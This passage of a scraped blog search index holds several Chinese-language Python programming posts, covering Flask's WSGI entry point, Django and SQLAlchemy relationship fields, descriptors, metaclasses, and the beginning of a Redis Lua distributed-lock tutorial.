stuff from an interactive shell. self._got_first_request = False    首先进入眼帘的是关于 flask/cli 的内容。 点进 explain_ignored_app_run 可以得知这是一个防止用户犯蠢写下 app.run() 后又用 flask run在命令行启动留下的说明性输出。\n其次是 dotenv 相关的玩意儿，没用过 dotenv 推荐去了解下 python-dotenv 这个包。可以很方便地配置好开发环境下的环境变量。\n经过一堆类型转换和检查之后，终于看到了这几行。\n flask/app.py COMMIT a74864e , Line 941 ~ 949\n1 2 3 4 5 6 7 8 9  from werkzeug.serving import run_simple try: run_simple(host, port, self, **options) finally: # reset the first request information if the development server # reset normally. This makes it possible to restart the server # without reloader and that stuff from an interactive shell. self._got_first_request = False    run_simple？这就是 WSGI Server 启动的地方了。\n看看 werkzeug 文档吧，我这里摘一段。\n Serving WSGI Applications There are many ways to serve a WSGI application. While you’re developing it, you usually don’t want to have a full-blown webserver like Apache up and running, but instead a simple standalone one. Because of that Werkzeug comes with a builtin development server. The easiest way is creating a small start-myproject.py file that runs the application using the builtin server:\n1 2 3 4 5 6 7 8  #!/usr/bin/env python # -*- coding: utf-8 -*- from werkzeug.serving import run_simple from myproject import make_app app = make_app(...) run_simple(\u0026#39;localhost\u0026#39;, 8080, app, use_reloader=True)    从函数签名可以看得出，run_simple启动时，flask 将自己作为 wsgi app 参数传给了 werkzeug，不难猜测出，Flask 本身是一个可调用对象，即重写了 __call__ 方法。\n2.2 __call__ 来到__call__，发现它调用了self.wsgi_app，本身没做任何事。\n flask/app.py COMMIT a74864e , Line 2323 ~ 2327\n1 2 3 4 5  def __call__(self, environ, start_response): \u0026#34;\u0026#34;\u0026#34;The WSGI server calls the Flask application object as the WSGI application. This calls :meth:`wsgi_app` which can be wrapped to applying middleware.\u0026#34;\u0026#34;\u0026#34; return self.wsgi_app(environ, start_response)    再来到 wsgi_app 的定义。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  def wsgi_app(self, environ, start_response): \u0026#34;\u0026#34;\u0026#34; 略 \u0026#34;\u0026#34;\u0026#34; ctx = self.request_context(environ) error = None try: try: ctx.push() response = self.full_dispatch_request() except Exception as e: error = e response = self.handle_exception(e) except: error = sys.exc_info()[1] raise return response(environ, start_response) finally: if self.should_ignore_error(error): error = None ctx.auto_pop(error)   这里，就是整个 Flask 作为 wsgi app，处理 request 的入口点了。\n从这儿我们能鸟瞰整个 flask 框架的核心逻辑。environ被包装成 request，压栈，full_dispatch_request路由至视图，处理异常，一切结束后清栈。\n","date":"2019-03-17T00:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/flask%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0wsgi/","title":"Flask源码阅读笔记：WSGI"},{"content":" 参考资料如下\n Django 文档 - Model field reference SQLAlchemy 中的级联删除   1. ForeignKey ForeignKey用于多对一关系，直接对应到数据库外键的概念。使用ForeignKey需要指定引用的目标表，会自动关联到目标表的主键（一般是id字段）。\n例子如下。\n1 2 3 4 5 6 7 8 9  from django.db import models class Child(models.Model): parent = models.ForeignKey(\u0026#39;Parent\u0026#39;, on_delete=models.CASCADE, ) # ... class Parent(models.Model): # ... pass   对比之 sqlalchemy，一行parent=models.ForeignKey(...)包含了 sqlalchemy 中的ForeignKey和relationship两部分内容。\n1.1 参数：on_delete on_delete意为当ForeignKey引用的对象被删除时进行的操作。\n有几个可以考虑的选项。\n1.1.1 models.CASCADE CASCADE意为级联，on_delete设置为CASCADE时意为执行级联删除。依据文档，Django 会模仿 SQL 的ON DELETE CASCADE，对包含了ForeignKey的对象执行删除。\n需要注意的是不会调用被级联删除对象上的model.delete()，但是会发送pre_delete和post_delete信号。\n1.1.1.2 models.PROTECT PROTECT意为保护，on_delete设置为PROTECT意味着要阻止删除操作发生。删除关联的对象时，ForeignKey的on_delete设置为PROTECT会触发ProtectedError。\n1.1.1.3 models.SET_NULL 如其名所述，如果这个ForeignKey是 nullable 的，则关联的对象删除时将外键设置为 null。\n1.1.1.4 models.SET_DEFAULT 如其名所述，如果这个ForeignKey设置了DEFAULT，则关联的对象删除时设置这个外键为DEFAULT值。\n1.1.1.5 models.SET 在关联的对象删除时，设置为一个指定的值。这个参数可以接受一个可以赋值给这个 ForeignKey 的对象或者一个可调用对象。\n官方例子如下。\n1 2 3 4 5 6 7 8 9 10 11 12  from django.conf import settings from django.contrib.auth import get_user_model from django.db import models def get_sentinel_user(): return get_user_model().objects.get_or_create(username=\u0026#39;deleted\u0026#39;)[0] class MyModel(models.Model): user = models.ForeignKey( settings.AUTH_USER_MODEL, on_delete=models.SET(get_sentinel_user), )   1.1.1.6 models.DO_NOTHING 应该不用多说了吧。Django 不会做多余的事情，但是如果后端的数据库服务有强制完整性约束，除非你在数据库一端自己定义了ON DELETE，否则会触发IntegrityError。\n1.2 参数：limited_choice_to 强制约束为 django.admin 或者 ModelForm 渲染时提供有限的可选项。\n接受参数为dict或者Q对象、返回Q对象的可调用对象。\n官方例子。\n1 2 3 4 5  staff_member = models.ForeignKey( User, on_delete=models.CASCADE, limit_choices_to={\u0026#39;is_staff\u0026#39;: True}, )   Q 对象是什么玩意儿这个我搞明白了再说\u0026hellip;\n1.3 参数：related_name 设置反向关联的字段名，和sqlalchemy的backref类似。\n举例来说。\n1 2 3 4 5 6 7 8  class Child(models.Model): parent = models.ForeignKey(\u0026#39;Parent\u0026#39;) class Parent(models.Model): pass Parent.child_set.all() # 未设置 related_name Parent.children.all() # 设置 related_name=children   1.4 参数：related_query_name related_query_name 和 related_name 类似，设置反向引用查询时条件的前缀名。举例来说。\n1 2 3 4 5 6 7 8 9  class Child(models.Model): parent = models.ForeignKey(\u0026#39;Parent\u0026#39;) name = models.CharField(max_length=4) class Parent(models.Model): pass Parent.objects.filter(Child__name=\u0026#39;沙雕网友\u0026#39;) # 未设置 related_query_name Parent.objects.filter(myboy__name=\u0026#39;沙雕网友\u0026#39;) # 设置 related_query_name=myboy   1.5 参数：to_field 得到ForeignKey关联的模型的字段，默认是主键，如果指定的不是主键那么必须有unique约束才行。\n1.6 参数：db_constraint 要不要创建数据库层级的约束，也就是通过后端数据库服务确保数据完整性不受破坏。如果设置为 False 那么访问不存在的对象时会触发 DoesNotExists 异常。\n1.7 参数：swappable 用于处理“我有一个抽象类模型但是这个模型有一个外键”的情况，典型就是AUTH_USER_MODEL。\n一般不用改到，这个属性控制了数据库迁移时如何处理这个外键关联的表，总之保持默认值就行了。\n这个功能支持了使用自定义的用户模型替代 django.auth.models.User 之类的玩意儿。\n2. OneToOneField OneToOneField 基本就是一个加了unique约束的ForeignKey。使用上与 ForeignKey 略有不同。\n首先是访问 OneToOneField 时，得到的不是 QuerySet 而是一个对象实例。\n1 2 3 4 5 6 7 8  # 优生优育政策（ class Parent(models.Model): child = OneToOneField(\u0026#39;Child\u0026#39;) class Child(models.Model): pass parent.child # =\u0026gt; 得到一个 Child 实例   其次是反向引用的名字是模型名字小写。\n1  child.parent # =\u0026gt; 得到一个 Parent 实例   如果指定 related_name 那就和 ForeignKey 一个表现。\n3. ManyToManyField 基本和ForeignKey相同。\n3.1 和 ForeignKey 相同的参数  related_name related_query_name limited_choices_to db_constraint swappable  limited_choices_to 在指定自定义中间表的情况下无效。\n3.2 参数：symmetrical 用于处理一个表自己对自己的多对多引用对称性。\nDjango 的默认行为是，我是你的朋友，那么你就是我的朋友。\n设置了这个参数则强迫 Django 改变这个行为，允许“被朋友”。\n3.3 参数：through 默认情况下，Django 会自行创建中间表，这个参数强制指定中间表。\n默认中间表模型里包含三个字段。\n id \u0026lt;containing_model\u0026gt;_id \u0026lt;other_model\u0026gt;_id  如果是自己和自己的多对多关系，则\n id from_\u0026lt;model\u0026gt;_id to_\u0026lt;model\u0026gt;_id  3.4 参数：through_fields 当自行指定中间表，中间表又包含了多个外键时，指定关联的外键用。\n举例。\n1 2 3 4 5 6 7 8 9 10  class ModelA(models.Model): b = models.ManyToManyField(ModelB, through=\u0026#39;ModelC\u0026#39;) class ModelB(models.Model): pass class ModelC(models.Model): a=models.ForeignKey(\u0026#39;ModelA\u0026#39;) b=models.ForeignKey(\u0026#39;ModelB\u0026#39;) c=models.ForeignKey(\u0026#39;ModelA\u0026#39;)   此时在中间表中a和c都是对ModelA的外键，产生了歧义，Django 无法自行决定用哪个外键来关联 AB 两个表。\n这时提供参数。\n1  b = models.ManyToManyField(\u0026#39;ModelB\u0026#39;, through=\u0026#39;ModelC\u0026#39;, through_fields=(a, b))   ManyToManyField 关联两个表总是不对称的关系（指我把你当兄弟，你却想当我爸爸这样的关系。此时“我”对“你”的“兄弟”关系就是单向的。），这就形成了来源和目标的概念。\nthrough_fields 的第一个元素总被认为是来源字段，第二个元素是目标字段。\n3.5 参数：db_table 指定 Django 创建的中间表的名字，默认根据两个表表名和 ManyToManyField 的名字决定。\n","date":"2019-03-06T21:11:35+08:00","permalink":"https://nnnewb.github.io/blog/p/django-%E7%9A%84%E5%90%84%E7%A7%8D%E5%85%B3%E7%B3%BB%E5%AD%97%E6%AE%B5%E8%AF%A6%E8%A7%A3/","title":"Django 的各种关系字段详解"},{"content":"Intro 找不到工作十分难受，在家看书，恰巧翻到这本《轻量级 Django》，看起来还蛮有意思的，做个读书笔记。\n1. 最小的 Django App Django 是个重量级框架，所谓最小指的是写最少的代码，理解一个 Django App 的最小组成元素。\n作为开场，先创建一个 app.py 文件，作为整个 Django App 存储的地方。\n1.1 django.conf.settings 书中使用 django.core.management.execute_from_command_line 作为启动 Django app 的手段。\nexecute_from_command_line，就是通过 django startproject的方式创建的manage.py内的主要内容，这种方式启动必须要配置settings才行。\n在一个常规方式创建的 Django App 中，settings.py是一个独立的 python 模块，Django通过DJANGO_SETTINGS_MODULE这个环境变量来确定配置信息存储位置。\n但是换一种方式，django.conf.settings.configure()可以手动完成配置。\n看代码。\n1 2 3  from django.conf import settings settings.configure(DEBUG=True, ROOT_URLCONF=__name__, )   每一个 keyword argument 都和 settings.py这个模块内的名字相同，去除所有不必要的元素之后，剩下的就是DEBUG和ROOT_URLCONF了。\n阅读源码可知configure只能被调用一次。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # 摘自 django.conf.settings.configure 源码 # Django 版本号: # VERSION = (2, 1, 7, \u0026#39;final\u0026#39;, 0) def configure(self, default_settings=global_settings, **options): \u0026#34;\u0026#34;\u0026#34; Called to manually configure the settings. The \u0026#39;default_settings\u0026#39; parameter sets where to retrieve any unspecified values from (its argument must support attribute access (__getattr__)). \u0026#34;\u0026#34;\u0026#34; if self._wrapped is not empty: raise RuntimeError(\u0026#39;Settings already configured.\u0026#39;) holder = UserSettingsHolder(default_settings) for name, value in options.items(): setattr(holder, name, value) self._wrapped = holder   1.2 urlpatterns 都知道 Django 的路由是需要手动写明的，和flask等以装饰器的方式配置路由的风格迥异。哪种风格更好，就看用户自己见仁见智了。\n上文的settings.configure中可以看到有一句ROOT_URLCONF=__name__，意义明确，就是指定哪个 python 模块保存了路由配置信息，而这里指定的__name__正是自己。\n所以我们的urlpatterns也应当如配置所述，写到这个文件中。\n见代码。\n1 2 3 4  from django.urls import path from django.http import HttpResponse urlpatterns = [path(\u0026#39;\u0026#39;, lambda req: HttpResponse(\u0026#39;Hello world\u0026#39;))]   1.3 __main__ 最后将所有的代码整合起来，就形成了这样一个 python 程序。\n1 2 3 4 5 6 7 8 9 10 11 12  import sys from django.conf import settings from django.core.management import execute_from_command_line from django.http import HttpResponse from django.urls import path settings.configure(DEBUG=True, ROOT_URLCONF=__name__, ) urlpatterns = [path(\u0026#39;\u0026#39;, lambda req: HttpResponse(\u0026#39;Hello world\u0026#39;))] if __name__ == \u0026#39;__main__\u0026#39;: execute_from_command_line(sys.argv)   算上所有的 import 在内共 12 行，4 行空行，5 行 import，3 行代码，即构成了一个麻雀虽小五脏俱全的 Django hello world。\n在命令行执行python app.py runserver即可看到以下输出。\n1 2 3 4 5 6 7 8  PS D:\\GitHub\\minimum-django\u0026gt; python .\\app.py runserver Performing system checks... System check identified no issues (0 silenced). March 03, 2019 - 12:10:21 Django version 2.1.7, using settings None Starting development server at http://127.0.0.1:8000/ Quit the server with CTRL-BREAK.   1.4 wsgi 完成了最小的 django app，依然有一个问题。\n如何部署这个 django app？\n固然，使用 runserver 的方式执行，再 nginx 反向代理是一个不错的主意，但 uwsgi 之类的部署方式依然有其独到的优势。\n使用 uwsgi 或者 gunicorn 之类的基于 wsgi 协议的服务器就必须取得一个 wsgi app 实例才行。\nDjango 提供了函数 django.core.wsgi.get_wsgi_application 用于取得 wsgi app。\n手头没 linux 机器，懒得演示 output 了。就这样吧。\n最终代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import sys from django.conf import settings from django.core.management import execute_from_command_line from django.core.wsgi import get_wsgi_application from django.http import HttpResponse from django.urls import path settings.configure(DEBUG=True, ROOT_URLCONF=__name__, ) urlpatterns = [path(\u0026#39;\u0026#39;, lambda req: HttpResponse(\u0026#39;Hello world\u0026#39;))] application = get_wsgi_application() if __name__ == \u0026#39;__main__\u0026#39;: execute_from_command_line(sys.argv)   使用gunicorn app.py --log-file=-启动。\n","date":"2019-03-03T12:26:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E8%BD%BB%E9%87%8F%E7%BA%A7-django-%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E6%9C%80%E5%B0%8F%E7%9A%84-django-%E5%BA%94%E7%94%A8/","title":"轻量级 django 阅读笔记：最小的 django 应用"},{"content":"注意事项 ForeignKey db.ForeginKey的参数是\u0026lt;表名\u0026gt;.\u0026lt;键名\u0026gt;，而不是\u0026lt;类名\u0026gt;.\u0026lt;字段名\u0026gt;，务必注意这个区别。\nback_populates 和 backref 在多对多关系中使用的区别 back_populates是更推荐的写法。\n多对多关系中使用backref并指定了secondary的话，另一张表关联的relationship字段会使用相同的secondary。\nback_populates则需要在两张表的relationship中都写上相同的secondary中间表。\n可调用的 secondary secondary参数可以是一个可调用对象，做一些 trick 的时候应该有用。姑且记下。\n一对多关系 1 2 3 4 5 6 7 8 9 10  class Parent(Base): __tablename__ = \u0026#39;parent\u0026#39; id = Column(Integer, primary_key=True) child = relationship(\u0026#34;Child\u0026#34;, back_populates=\u0026#34;parent\u0026#34;) class Child(Base): __tablename__ = \u0026#39;child\u0026#39; id = Column(Integer, primary_key=True) parent_id = Column(Integer, ForeignKey(\u0026#39;parent.id\u0026#39;)) parent = relationship(\u0026#34;Parent\u0026#34;, back_populates=\u0026#34;child\u0026#34;)   parent包含多个child的一对多关系。child里写ForeignKey为parent的主键，child里写relationship，parent里同样写relationship，back_populates填充上，完事。\n一对一关系 1 2 3 4 5 6 7 8 9 10  class Parent(Base): __tablename__ = \u0026#39;parent\u0026#39; id = Column(Integer, primary_key=True) child = relationship(\u0026#34;Child\u0026#34;, uselist=False, back_populates=\u0026#34;parent\u0026#34;) class Child(Base): __tablename__ = \u0026#39;child\u0026#39; id = Column(Integer, primary_key=True) parent_id = Column(Integer, ForeignKey(\u0026#39;parent.id\u0026#39;)) parent = relationship(\u0026#34;Parent\u0026#34;, back_populates=\u0026#34;child\u0026#34;)   一对一关系中parent需要在relationship里加入参数uselist，其他相同，完事儿。\n多对多关系 多对多关系需要一个中间表。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  association_table = Table(\u0026#39;association\u0026#39;, Base.metadata, Column(\u0026#39;left_id\u0026#39;, Integer, ForeignKey(\u0026#39;left.id\u0026#39;)), Column(\u0026#39;right_id\u0026#39;, Integer, ForeignKey(\u0026#39;right.id\u0026#39;)) ) class Parent(Base): __tablename__ = \u0026#39;left\u0026#39; id = Column(Integer, primary_key=True) children = relationship( \u0026#34;Child\u0026#34;, secondary=association_table, back_populates=\u0026#34;parents\u0026#34;) class Child(Base): __tablename__ = \u0026#39;right\u0026#39; id = Column(Integer, primary_key=True) parents = relationship( \u0026#34;Parent\u0026#34;, secondary=association_table, back_populates=\u0026#34;children\u0026#34;)   中间表里写上parent和child的主键作为foreignkey，parent和child里的relationship加入参数secondary，指定为中间表。\n","date":"2019-03-01T15:52:00+08:00","permalink":"https://nnnewb.github.io/blog/p/sqlalchemy-%E5%90%84%E7%A7%8D%E8%A1%A8%E5%85%B3%E7%B3%BB/","title":"sqlalchemy 各种表关系"},{"content":"1.概念简介 1.1 property 在 python 代码中，property 是非常常见的一个内置函数。property 可以为一个 python 类的 attribute 设置 getter/setter，可以类比之 C# 的 properties。\n见下面的例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class A: def __init__(self): self.a = 1 @property() def hello(self): return self.a @hello.setter() def hell(self, value): self.a = value print(A().hello) # output: # 1 obj = A() obj.hello = \u0026#34;hello world\u0026#34; print(obj.hello) # output: # hello world   1.2 descriptor python 中的 descriptor 指的是实现了__get__、__set__、__delete__三个方法之一的类。\n当一个 descriptor 类的实例作为其他类的成员时，通过obj.attr语法访问该实例将会调用 descriptor 实例的__get__方法。同理，__set__和__delete__也是相似的逻辑。\n先看个例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class DescriptorClass: def __get__(self, instance, owner): print(self) print(instance) print(owner) return \u0026#39;some value\u0026#39; class SomeClass: some_attr = DescriptorClass() print(SomeClass().some_attr) # output: # \u0026lt;__main__.DescriptorClass object at 0x0000027AAE777160\u0026gt; # \u0026lt;__main__.SomeClass object at 0x0000027AAE777198\u0026gt; # \u0026lt;class \u0026#39;__main__.SomeClass\u0026#39;\u0026gt; # some value   2. 实现 property 的逻辑在于，当实例访问这个属性时，调用方法。descriptor 刚好处在那个正确的位置上。\n看代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  class PropertyDescriptor: def __init__(self, fn): self.getter = fn def __get__(self, instance, owner): return self.getter(instance) def __set__(self, instance, value): return self.setter(instance, value) def setter(self, func): self.setter = func return self def my_property(func): return PropertyDescriptor(func) class SimpleClass: @my_property def simple_attr(self): return \u0026#39;a simple property\u0026#39; @simple_attr.setter def simple_attr(self, value): print(\u0026#39;simple attr setter\u0026#39;) print(SimpleClass().simple_attr) SimpleClass().simple_attr = \u0026#39;something\u0026#39; # output: # a simple property # simple attr setter   3. 总结  个人看法，谨慎参考\n descriptor 避免了重复编写getter和setter方法，非常直觉的一种用途就是类似于SQLAlchemy这样的 ORM 框架的的字段映射。不需要为每一个特定类型的字段在基类或元类里编写大量样板代码。\n但这种设计是侵入式的（需要修改目标类的代码），而且非常不直观。在合适的地方使用相信可以有其发光发热的空间。\n对可读性来讲，结合元类，这俩被一起滥用的话对维护者而言完全是地狱吧\u0026hellip;\n","date":"2019-02-21T17:53:00+08:00","permalink":"https://nnnewb.github.io/blog/p/%E5%88%A9%E7%94%A8-descriptor-%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84-property/","title":"利用 descriptor 实现自己的 property"},{"content":"0. intro 元类是 python 里被说烂了的一个东西，然而日常用到的地方实在不多，每次想到都得查一下谷歌，想想干脆在博客留个笔记好了。\n元类的主要用途是定制类的产生过程，以便于根据类声明包含的信息来创建出不同的类。\n1. type 提到元类不得不说一下 python 的类型系统。\npython 的 class 也被视作一个对象，定制一个 class 的构造过程其实就和平时在 class 定义里写__init__没啥区别。\npython3 里类的类型是type，type又继承自object，object的父类是自己，构成一个奇怪的闭环。其中，type本身是一个特殊的类，他是自己的实例。\n1 2 3 4 5 6 7  graph TB; type --\u0026gt; |inherite|object; type --\u0026gt; |instance-of| type; object --\u0026gt; |instance-of|type; other-cls --\u0026gt; |instance-of| type; other-cls --\u0026gt; |inherite| object; other-cls-instance --\u0026gt; |instance-of|other-cls;   type有两种调用方式，一种是最常用的接受一个对象参数，返回该对象的类型，另一种是不怎么常用的，直接创建一个新的类型。\n1 2 3 4 5  # usage with one argument type(object) # 返回对象的类型，这里返回的是 `type` # usage with three arguments type(name, bases, attr) # 返回新创建的类型   2. meta class 元类语法如下\n1  class MyClass(basecls1, basecls2, metaclass=MetaClass, named1=arg, named2=arg): ...   一般的元类可以是一个真正的class或者一个函数。\n以函数为例：\n1 2 3 4  def meta_f(name, bases, attr): return type(name, bases, attr) class A(metaclass=meta_f): ...   以类为例：\n1 2 3 4 5  class MetaC(type): def __new__(mcs, name, bases, attr): return type.__new__(mcs, name, bases, attr) class A(metaclass=MetaC): ...   元类可以接受参数，参数必须是命名的，传递参数的方式是写在类声明的继承列表里。\n1 2 3 4 5 6  def meta(name, bases, attr, named_arg, optional_arg=None): return type(name, bases, dict(**attr, arg=named_arg, option=optional_arg)) class A(metaclass=meta, named_arg=\u0026#34;hi\u0026#34;): ... print(A.arg) # output: hi   位置参数都会被当成继承列表，作为bases参数(list)的一部分传入元类。\n3. 元类继承规则 有了元类那么就有了相应继承规则，显而易见。元类用于构造一个类，两个父类分别有一个不同的元类显然会造成冲突：这个子类用哪个元类构造？\n首先看元类的在创建类的过程中的位置，摘自 python 文档3.3.3.1. Metaclasses\n  MRO entries are resolved the appropriate metaclass is determined the class namespace is prepared the class body is executed the class object is created   一旦处理完继承链（mro, method resolve order）之后，就会决定采用哪个 metaclass 作为构造这个类的元类。\n在 python 文档的3.3.3.3 determining the appropriate metaclass中描述了如何确定合适的元类，摘录如下。\n  if no bases and no explicit metaclass are given, then type() is used if an explicit metaclass is given and it is not an instance of type(), then it is used directly as the metaclass if an instance of type() is given as the explicit metaclass, or bases are defined, then the most derived metaclass is used   翻译如下\n 如果没有基类也没有指定 metaclass，那么type()将作为元类使用。 如果指定了元类，并且该元类不是 type 的实例，那么直接使用这个元类。 如果元类是一个 type 的实例，或者存在基类，那么使用最衍生的元类。  有一个比较难理解的点是\n most derived metaclass\n 也就是所谓的最衍生的元类。惯例，先放文档解释\n The most derived metaclass is selected from the explicitly specified metaclass (if any) and the metaclasses (i.e. type(cls)) of all specified base classes. The most derived metaclass is one which is a subtype of all of these candidate metaclasses. If none of the candidate metaclasses meets that criterion, then the class definition will fail with TypeError.\n 简单翻译如下\n 最衍生的元类会从类声明中明确提供的元类，还有所有明确继承的基类的元类中选择。最衍生的元类是以上所有候选元类的子类型，如果没有类型符合这一条件，则抛出TypeError异常。\n 重点在于，最衍生的元类必须是，所有继承的基类的元类和指定元类的子类型。\n在这里提醒一下，issubclass(cls, cls)的结果是True。换句话说，必须有一个类是所有元类的子类，或者所有基类有相同的元类。\n代码举例如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  class MetaA(type): def __new__(mcs, name, bases, attr): print(\u0026#39;MetaA \u0026lt;- \u0026#39;+name) return type.__new__(mcs, name, bases, attr) class MetaB(type): def __new__(mcs, name, bases, attr): print(\u0026#39;MetaB \u0026lt;- \u0026#39;+name) return type.__new__(mcs, name, bases, attr) class BaseA: ... class BaseB(metaclass=MetaA): ... class BaseC(metaclass=MetaB): ... # 未指定元类，基类元类分别是type和type的子类，则选择继承链底部的那个类 class A(BaseA, BaseB): ... # Ok,元类是 MetaA # 指定元类，元类和基类元类相同的情况下，元类就是那个元类 class C(BaseB, metaclass=MetaA): ... # Ok，元类是 MetaA # 指定元类，元类并不处于继承链底端的情况下，元类选择继承链底端的类 class D(BaseB, metaclass=type): ... # Ok，元类是 MetaA # 指定元类，但元类和父类无父子类关系 class E(BaseC, metaclass=MetaA): ... # TypeError # 不指定元类，基类具有不同的元类 class F(BaseA,BaseB,BaseC): ... # TypeError   输出如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  MetaA \u0026lt;- A MetaA \u0026lt;- C MetaA \u0026lt;- D In [71]: class E(BaseC, metaclass=MetaA): ... # TypeError --------------------------------------------------------------------------- TypeError Traceback (most recent call last) \u0026lt;ipython-input-71-9129a36c52b2\u0026gt; in \u0026lt;module\u0026gt; ----\u0026gt; 1 class E(BaseC, metaclass=MetaA): ... # TypeError TypeError: metaclass conflict: the metaclass of a derived class must be a (non-strict) subclass of the metaclasses of all its bases In [72]: class F(BaseA,BaseB,BaseC): ... # TypeError --------------------------------------------------------------------------- TypeError Traceback (most recent call last) \u0026lt;ipython-input-72-1c510edd69d1\u0026gt; in \u0026lt;module\u0026gt; ----\u0026gt; 1 class F(BaseA,BaseB,BaseC): ... # TypeError TypeError: metaclass conflict: the metaclass of a derived class must be a (non-strict) subclass of the metaclasses of all its bases   但元类是函数的情况下会有比较特殊的表现，注意规则二。\n  如果指定了元类，并且该元类不是 type 的实例，那么直接使用这个元类。   如果函数形式的元类作为父类的元类时不会列入选择，除非指定当前类的元类为函数，才会调用函数形式的元类，而且是无条件选择这个函数形式的元类。\n1 2 3 4 5 6 7 8 9  def MetaA(name, bases, attr): print(\u0026#34;MetaA \u0026lt;- \u0026#34;+name) return type(name, bases, attr) class MetaB(type): def __new__(mcs, name, bases, attr): return type.__new__(mcs, name, bases, attr) class A(MetaB, metaclass=MetaA): ... # Ok，无条件选择元类 MetaA   ","date":"2018-12-20T19:46:00+08:00","permalink":"https://nnnewb.github.io/blog/p/python3%E5%85%83%E7%B1%BB%E6%B7%B1%E5%85%A5%E8%A7%A3%E8%AF%BB/","title":"python3元类深入解读"},{"content":"Intro 分布式不是啥黑魔法，究其理念无非是用多台服务器处理更多的请求。提高每秒处理的数据量，并发就不可避免了。\n在单机并发的情况下，我们可以用 mutex，可以用 os 的文件锁，全局锁，多台服务器的并发就需要另一个持有并保护锁的角色了。\n概述如何使用 redis 实现一个分布式锁。\n为何是 Lua redis 保证了 lua 解释器执行脚本的事务性，即执行结果要么不可见，要么已完成。\n参考这篇文档。\n简单锁 简单锁指的是简单互斥锁，一旦锁定，则其他锁定请求都必须等待。\n加锁 直觉的想法是通过 redis 的键来保持锁，故准备一个用于锁定互斥的名字（比如说 mutex-1）然后指定为键。\n直接使用 set 是显然不正确的，如果临界区内程序崩溃或意外断网将导致死锁，所以 setnx 和 expire 是必选项。\n加锁需要判断锁的键为空，才能加锁，这两步必须保证原子性，要么都执行，要么一个都不执行。幸好 redis 提供了这方面保证，只要使用 lua 脚本的话。\n1 2 3 4 5 6 7 8 9  -- 加锁 if redis.call(\u0026#34;get\u0026#34;, KEYS[1]) == nil then if redis.call(\u0026#34;setnx\u0026#34;, KEYS[1], ARGV[1]) == 1 then redis.call(\u0026#34;expire\u0026#34;, KEYS[1], ARGV[2]) return 1 else return end end   上面的 lua 代码用 python 再封装一层，就是这样\n1 2 3 4 5 6 7 8 9 10 11 12 13  def lock(key, expire): redis.eval( \u0026#39;\u0026#39;\u0026#39; -- 加锁 if redis.call(\u0026#34;get\u0026#34;, KEYS[1]) == nil then if redis.call(\u0026#34;setnx\u0026#34;, KEYS[1], ARGV[1]) ~= nil then redis.call(\u0026#34;expire\u0026#34;, KEYS[1], ARGV[2]) return 1 else return end end \u0026#39;\u0026#39;\u0026#39;, 1, key, \u0026#34;lock\u0026#34;, expire)   解锁 解锁代码同样是通过 lua 实现。\n下面是错误实现例子。\n1  return redis.call(\u0026#34;del\u0026#34;, KEYS[1])   错误之处在于会解除非自己加的锁。如果临界区内的工作时间超过预期时间，那么就会造成误解锁的问题。\n下面是正确例子。\n为了标记锁持有者，需要修改加锁代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13  def lock(key, owner, expire): redis.eval( \u0026#39;\u0026#39;\u0026#39; -- 加锁 if redis.call(\u0026#34;get\u0026#34;, KEYS[1]) == nil then if redis.call(\u0026#34;setnx\u0026#34;, KEYS[1], ARGV[1]) ~= nil then redis.call(\u0026#34;expire\u0026#34;, KEYS[1], ARGV[2]) return 1 else return end end \u0026#39;\u0026#39;\u0026#39;, 1, key, owner, expire)   解锁的 lua 代码。\n1 2 3 4 5 6  -- 解锁 if redis.call(\u0026#34;get\u0026#34;, KEYS[1]) == ARGV[1] then return redis.call(\u0026#34;del\u0026#34;, KEYS[1]) else return 0 end   解锁的 python 代码。\n1 2 3 4 5 6 7 8 9 10 11 12  def unlock(key, lock): redis.eval( \u0026#39;\u0026#39;\u0026#39; -- 解锁 if redis.call(\u0026#34;get\u0026#34;, KEYS[1]) == ARGV[1] then return redis.call(\u0026#34;del\u0026#34;, KEYS[1]) else return 0 end \u0026#39;\u0026#39;\u0026#39;, 1, key, lock )   超时和一致性 关于超时有这样一个问题在。如果超时时间过长，那么超时的设置意义就不大，服务宕机 1 小时和宕机 24 小时都是事故。如果超时时间过短，那么超时就可能造成一致性上的损害。\n举例来说，付款处理花了 2.1s，但是锁超时 2.0s。这 0.1s 的数据竞争时间里，更新update balance where id = xxx和下一个更新 blance 的请求就指不定谁先执行了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  sequenceDiagram participant 付款 participant 汇款 participant 锁 付款-\u0026gt;\u0026gt;锁:请求锁 锁--\u0026gt;\u0026gt;付款:已锁定 汇款-\u0026gt;\u0026gt;锁:请求锁 note over 付款,锁: 锁在2秒后超时，付款程序在2.1秒后完成 note over 锁: 2.0s到了，超时解锁 锁--\u0026gt;\u0026gt;汇款:已锁定 note over 付款,汇款:数据竞争 note over 付款:完成。   所以，设置了超时，那么必须保证一致性，整个处理要么全部完成，要么超时全部未完成，对编程能力提出了挑战。\n后续再想想能不能写篇博文。\n读写锁 读写锁的实现和简单锁别无二致，特征是多个读，一个写。在大量读取，少量写入的情况下，读写锁可以有效提高效率。\n加读锁 读锁实现和简单锁差别不大，在简单锁基础上稍作修改即可。\n1 2 3 4 5 6  -- 读锁 if redis.call(\u0026#34;get\u0026#34;, KEYS[1]..\u0026#34;:write\u0026#34;) then return 0 else return redis.call(\u0026#34;hset\u0026#34;, KEYS[1]..\u0026#34;:read\u0026#34;, ARGV[1], 1) end   加写锁 写锁实现差别也不大，这里使用 hash table 解决标记持有人的问题。\n1 2 